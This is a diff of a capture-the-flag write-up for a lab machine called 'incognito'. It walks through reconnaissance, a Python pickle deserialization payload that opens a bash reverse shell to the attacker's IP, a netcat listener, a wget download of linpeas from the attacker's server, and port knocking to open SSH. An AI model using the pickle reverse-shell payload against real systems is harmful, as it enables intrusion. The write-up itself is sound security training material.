@@ -4,50 +4,42 @@
   <img alt="gamebuzz" src="https://github.com/user-attachments/assets/b82d2e36-8800-4cd3-98a7-388c3ff47c7b" height='200'></img>
 </div>
 
-St1p 1: Recconance
+# St1p 1: Recconance
 
 Let scan the Network:
 ```bash
-~$ nmap 10.10.205.198 -sV -sC -Pn
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-08 11:55 IST
-Nmap scan report for 10.10.205.198
+~$ nmap -sV 10.10.41.81
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-08 16:44 IST
+Nmap scan report for 10.10.41.81
 Host is up (0.17s latency).
 Not shown: 999 closed tcp ports (conn-refused)
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-title: Incognito
-|_http-server-header: Apache/2.4.29 (Ubuntu)
 ```
 
 As the only Port 80 is running let take a look
 
-![image](https://github.com/user-attachments/assets/8abe2a1f-be10-4b00-8cf9-06ae27178ffb)
+The Website seems static 
+![image](https://github.com/user-attachments/assets/233e54d5-ad38-4572-920c-8182810f51e7)
 
-The website seems Static and nothing usefull but at bottom i saw this
+There is button `game rating` when we intract with it grep a `object.pkl` file from upload folder:
 
-![image](https://github.com/user-attachments/assets/3ea0814f-49ef-4e52-8d83-771dcddfeaa5)
+![image](https://github.com/user-attachments/assets/ff0f3e68-c9f6-4271-bf66-195a225a97da)
 
-When we click on `game rating` button
+As i scroll down i found this:
 
-![image](https://github.com/user-attachments/assets/d7d44968-12a7-42a6-aa07-9b2e1cd1a5d0)
+![image](https://github.com/user-attachments/assets/7dcae918-7ed8-4b87-934c-89f3f1212119)
 
-and select any game 
+A domain name a the bottom of the main page:`admin@incognito.com` There might be subdomain 
 
-![image](https://github.com/user-attachments/assets/1b31f475-afc9-4d26-a106-3abcccd2cd1d)
-
-it loads a file with a `.pkl` extension.
- ![image](https://github.com/user-attachments/assets/138eb46d-1938-449d-958e-d5ee8b23166e)
-
-we find a domain name a the bottom of the main page:`admin@incognito.com` There might be subdomain 
-
-Doing a subdomain brute force we find a new domain.
-
-Let’s add it to the hosts file.
-```bash
-echo "10.10.205.198 incognito.com" | sudo tee -a /etc/hosts 
+Let dig deeper but first add ip to hosts file
 ```
+echo "10.10.41.81 incognito.com" | sudo tee -a /etc/hosts 
 ```
- ~$ ffuf -u http://incognito.com/ -H "Host: FUZZ.incognito.com" -w wordlists/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt -fw 8853
+
+Lets do a subdomain brute forc to find a new domain.
+```
+ffuf -u http://incognito.com/ -H "Host: FUZZ.incognito.com" -w wordlists/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt -fw 8853
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -71,20 +63,17 @@ ________________________________________________
  :: Filter           : Response words: 8853
 ________________________________________________
 
-dev                     [Status: 200, Size: 57, Words: 5, Lines: 2, Duration: 183ms]
-:: Progress: [4989/4989] :: Job [1/1] :: 170 req/sec :: Duration: [0:00:30] :: Errors: 0 ::
+dev                     [Status: 200, Size: 57, Words: 5, Lines: 2, Duration: 160ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 230 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
 ```
-
 we found `dev.incognito.com` let add this to host file
 ```
-echo "10.10.205.198 dev.incognito.com" | sudo tee -a /etc/hosts 
+echo "10.10.41.81 dev.incognito.com" | sudo tee -a /etc/hosts 
 ```
 
-![image](https://github.com/user-attachments/assets/efaac4ca-4150-4a71-b4a4-b556786f63f8)
-
-Let go more deep
+Let dig more deep
 ```
-~$ dirsearch -u http://dev.incognito.com
+dirsearch -u http://dev.incognito.com
 
   _|. _ _  _  _  _ _|_    v0.4.3
  (_||| _) (/_(_|| (_| )
@@ -149,100 +138,196 @@ Target: http://dev.incognito.com/
 
 Task Completed
 ```
-So we found an upload page `http://dev.incognito.com/secret/upload/`
+Ah ha! There’s an upload feature. Let’s start testing which types of files we can upload. `http://dev.incognito.com/secret/upload/`
 
-![image](https://github.com/user-attachments/assets/24f76ccf-fb0d-46cc-921f-2fa45f63dc0f)
+## Step 2: Exploitation
 
-Ah ha! There’s an upload feature. Let’s start testing which types of files we can upload.
+In start we saw the request carrying this:
+```
+{
+  "object":"/var/upload/games/object.pkl"
+}
+```
+That mean we need to upload revser shell with `.pkl` extention
 
-fire up burpsuite
-Step 2: Exploitation
-As it we saw the game rating button carry a `.pkl` file, after search on web i got this revrse shell: Change the ip before use, [learn more](https://frichetten.com/blog/escalating-deserialization-attacks-python/) on this 
+After reading some forums [learn more](https://frichetten.com/blog/escalating-deserialization-attacks-python/) I understand working of this the reverse shell crafted
 ```py
 #!/usr/bin/env python3
 import pickle, os
 class pickleSerilization(object):
     def __reduce__(self):
-        return (os.system,("bash -c 'bash -i >& /dev/tcp/10.17.14.127/1234 0>&1'",))
+        return (os.system,("bash -c 'bash -i >& /dev/tcp/10.xx.xx.xx/1234 0>&1'",))
 pickle.dump(pickleSerilization(), open("shell", "wb"))
 ```
 
-Execute the script to get a shell.pkl
+* This Python script creates a malicious `.pkl` (pickle) file that, when deserialized (loaded), will:
+* Execute a reverse shell to the attacker's IP (10.xx.xx.xx) on port 1234.
+
+Execute this script, it will create a shell file 
 ```
 python3 test.py
 ```
-![image](https://github.com/user-attachments/assets/40a16b59-cf61-4578-ba0b-b0912fa04e90)
 
-Now start Netcat in terminal,Now wait for connection
+Upload the shell on web
+![image](https://github.com/user-attachments/assets/d61ef82f-9746-4631-8bfd-bb7f02d7a100)
+
+Shell uploaded succufull 
+
+Before executing open netcat listner in new terminal
 ```
 nc -lnvp 1234
 ```
+Let execute shell by going to `incognito.com` and taping on `game rate` button 
+fire up burpsuite capture the request
+![image](https://github.com/user-attachments/assets/852d09ce-cd83-4fd4-8885-6b930bad1a6a)
 
-Upload the shell
-
-![image](https://github.com/user-attachments/assets/2a32e084-4688-4656-90d8-7fa600ab8794)
-
-Upload successfully
-
-![image](https://github.com/user-attachments/assets/472a1c5e-dc85-49f6-8b37-05076f50eb1a)
-
-Execute the shell from `http://incognito.com/`
-Click on game rating and generate the api call, dont forgot to on the intercept in burp
-
-![image](https://github.com/user-attachments/assets/165f31c1-04b0-422e-8195-b51f75aa18b0)
-Boom its working now let take a view at nc tab
-![image](https://github.com/user-attachments/assets/d0f2fc6e-52a4-466d-8abe-35bee78c07c1)
-
-Step 3:
-
-there are 2 acount we only have permission to view dev2
+Got the connection
 ```
-www-data@incognito:/home$ ls
+~$ nc -lnvp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.41.81 35388
+bash: cannot set terminal process group (1167): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@incognito:/$ 
+```
+
+# Step 3 : post exploitation
+We have 2 user `dev1` & `dve2` we dont permission to view dev1 so move to dev2 home directory to find usefull stuff
+
+## User flag.txt
+![image](https://github.com/user-attachments/assets/a35abe66-20d3-4644-8af1-6504651f1a46)
+
+Rather than wasting time focusing on upgrading privillage, so for that im transfering linpeas.sh form my system to this maching in /dev/shm folder using python server
+```bash
+www-data@incognito:/dev/shm$ wget http://10.17.14.127:8000/linpeas.sh
+wget http://10.17.14.127:8000/linpeas.sh
+--2025-06-08 11:42:26--  http://10.17.14.127:8000/linpeas.sh
+Connecting to 10.17.14.127:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 847925 (828K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+     0K .......... .......... .......... .......... ..........  6%  145K 5s
+    50K .......... .......... .......... .......... .......... 12%  306K 4s
+   100K .......... .......... .......... .......... .......... 18%  300K 3s
+   150K .......... .......... .......... .......... .......... 24% 4.17M 2s
+   200K .......... .......... .......... .......... .......... 30% 6.12M 2s
+   250K .......... .......... .......... .......... .......... 36%  324K 1s
+   300K .......... .......... .......... .......... .......... 42% 8.29M 1s
+   350K .......... .......... .......... .......... .......... 48% 16.8M 1s
+   400K .......... .......... .......... .......... .......... 54% 9.86M 1s
+   450K .......... .......... .......... .......... .......... 60% 4.63M 1s
+   500K .......... .......... .......... .......... .......... 66%  353K 1s
+   550K .......... .......... .......... .......... .......... 72% 7.18M 0s
+   600K .......... .......... .......... .......... .......... 78% 6.78M 0s
+   650K .......... .......... .......... .......... .......... 84% 54.4M 0s
+   700K .......... .......... .......... .......... .......... 90% 13.0M 0s
+   750K .......... .......... .......... .......... .......... 96% 6.88M 0s
+   800K .......... .......... ........                        100% 35.9M=1.0s
+
+2025-06-08 11:42:28 (795 KB/s) - 'linpeas.sh' saved [847925/847925]
+
+www-data@incognito:/dev/shm$ 
+```
+Let execute script
+```
+╔══════════╣ Searching installed mail applications
+
+╔══════════╣ Mails (limit 50)
+   131159      4 -rw-r--r--   1 root     mail           90 Aug 11  2021 /var/mail/dev1
+   131159      4 -rw-r--r--   1 root     mail           90 Aug 11  2021 /var/spool/mail/dev1
+```
+
+Let take a look at `/var/mail/dev1`
+```msg
+www-data@incognito:/dev/shm$ cat /var/mail/dev1
+cat /var/mail/dev1
+Hey, your password has been changed, dc647eb65e6711e155375218212b3964.
+Knock yourself in!
+www-data@incognito:/dev/shm$ 
+```
+Just getting curios to take a look at source code and found this hidden file `incognito.wsgi`
+```
+www-data@incognito:/var$ cd mail
+cd mail
+www-data@incognito:/var/mail$ ls
 ls
 dev1
-dev2
-www-data@incognito:/home$ cd dev1
-cd dev1
-bash: cd: dev1: Permission denied
-www-data@incognito:/home$ cd dev2
-cd dev2
-www-data@incognito:/home/dev2$ 
+www-data@incognito:/var/mail$ cd ..
+cd ..
+www-data@incognito:/var$ cd www
+cd www
+www-data@incognito:/var/www$ ls
+ls
+dev.incognito.com
+html
+incognito.com
+www-data@incognito:/var/www$ cd incognito.com
+cd incognito.com
+www-data@incognito:/var/www/incognito.com$ ls
+ls
+__pycache__
+incognito
+incognito.wsgi
+www-data@incognito:/var/www/incognito.com$ cat incognito.wsgi
+cat incognito.wsgi
+#!/usr/bin/python3
+import sys
+import logging
+logging.basicConfig(stream=sys.stderr)
+sys.path.insert(0,"/var/www/incognito.com/incognito/")
+
+from incognito import app as application
+application.secret_key = 'KeepITSecret'
+www-data@incognito:/var/www/incognito.com$ 
 ```
+We can Switch to dev2 wihout password
 
-User flag.txt
-![image](https://github.com/user-attachments/assets/9d277396-af57-4b9b-aac7-5eab5733df92)
-
-<!-- d14def35ed0bd914c1c5881fa0fa8090 -->
-
-Step 4: Privilage escaltion
-Now, let’s focus on escalating privileges to upgradable user. Let’s get started! I started running Linpeas.
-
-I open the python server on my system and 
-![image](https://github.com/user-attachments/assets/473b1115-32c1-4cbc-b97a-4cc0f1f1d17c)
-transfer the linpease.sh script
-![image](https://github.com/user-attachments/assets/75bb14bd-f519-4ca7-ad76-11581157d073)
-
-Got this
-![image](https://github.com/user-attachments/assets/e7ac5461-d485-4860-b2b6-3fe8edf627e6)
-
-Let take a view
-![image](https://github.com/user-attachments/assets/c06b351c-e842-425b-87b4-48bc37137106)
-
-It looks like we have the password for the dev1 user, but SSH is currently closed. We need to find a way to enable SSH to access it.
-
-Okay so the knock is hint for knock.conf file
-![image](https://github.com/user-attachments/assets/0f0c5b65-1cfe-47ae-a313-117f76ac373a)
-
-Let’s check its contents to see how the knock service is configured and what sequence or ports it uses. This might help us enable SSH access.
-![image](https://github.com/user-attachments/assets/e8447b15-d95a-4b83-b7d6-c821e349b485)
-
-After some research and  spending time reading some blog i got the way to knock the port
-```www-data@incognito:/var/mail$ knock -v 5020 6120 7340
-knock -v 5020 6120 7340
-hitting tcp 0.0.19.156:6120
-hitting tcp 0.0.19.156:7340
-www-data@incognito:/var/mail$ knock 10.10.205.198 5020 6120 7340
-knock 10.10.205.198 5020 6120 7340
-www-data@incognito:/var/mail$ 
+As the knock word in  msg , is hint of knock.conf revil by linpeas in ACLs file.
 ```
-We’ve completed the necessary steps with knock. Let’s try to open SSH and log in using the dev1 user credentials.
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
+# file: /etc/knockd.conf
+USER   root      rw-     
+user   dev1      rw-     
+GROUP  root      r--     
+mask             rw-     
+other            r--     
+
+files with acls in searched folders Not Found
+```
+Let view this 
+```
+cat /etc/knockd.conf
+```
+Knock.conf
+```
+www-data@incognito:/dev/shm$ cat /etc/knockd.conf
+cat /etc/knockd.conf
+[options]
+	logfile = /var/log/knockd.log
+
+[openSSH]
+	sequence    = 5020,6120,7340
+	seq_timeout = 15
+	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
+	tcpflags    = syn
+
+[closeSSH]
+	sequence    = 9000,8000,7000
+	seq_timeout = 15
+	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j REJECT
+	tcpflags    = syn
+
+www-data@incognito:/dev/shm$ 
+```
+After some research and spending some time i understood to open port with knock 
+As you can see, it has 2 port knocking sequences:
+
+Open SSH: 5020 -> 6120 -> 7340
+Close SSH: 9000 -> 8000 -> 7000
+Armed with above information, we can open the SSH service by knocking port 5020, 6120, 7340:
+
+```
+knock -v 10.10.41.81 5020 6120 7340
+```
